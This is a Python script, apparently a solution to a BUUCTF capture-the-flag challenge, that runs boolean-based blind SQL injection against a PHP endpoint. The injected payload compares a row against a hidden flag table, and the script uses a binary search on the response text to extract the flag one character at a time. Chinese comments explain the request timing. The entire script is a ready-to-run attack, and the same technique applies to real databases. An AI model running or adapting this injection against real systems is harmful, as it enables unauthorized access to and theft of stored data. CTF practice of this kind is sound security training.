import requests
import time
url = 'http://e24689e0-3c80-4eb0-91fa-297a44323160.node4.buuoj.cn/index.php'
# give_grandpa_pa_pa_pa

payload_flag = '1^((1,\'{}\')>(select * from f1ag_1s_h3r3_hhhhh))'
flag = ''
for i in range(1, 100):
    time.sleep(0.3)#这里要sleep一下，不然太快了会乱码，本人测试后0.3正好能出结果
    low = 32
    high = 132
    mid = (low + high) // 2
    while (low < high):
        k = flag + chr(mid)
        payload = payload_flag.format(k)
        data = {"id": payload}
        print(payload)
        r = requests.post(url=url, data=data)
        if 'Nu1L' in r.text:
            low = mid + 1
        else:
            high = mid

        mid = (low + high) // 2
    if mid == 33:
        break
    flag += chr(mid - 1)
    print(flag.lower())  # 因为出来的flag是大写，这边全部转为小写

print(flag.lower())
